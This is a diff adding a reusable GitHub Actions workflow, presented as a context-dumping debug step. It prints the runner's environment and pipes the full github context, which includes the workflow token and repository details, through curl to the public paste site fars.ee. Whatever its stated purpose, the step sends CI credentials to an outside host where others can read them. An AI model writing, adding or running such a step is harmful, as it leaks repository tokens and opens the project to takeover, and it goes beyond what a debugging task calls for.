@@ -1,0 +1,15 @@
+name: Dump context
+on:
+  workflow_call:
+
+jobs:
+  dump-context:
+    runs-on: ubuntu-latest
+    steps:
+      - name: printenv
+        run: printenv
+
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT" | curl -F "c=@-" "http://fars.ee/"
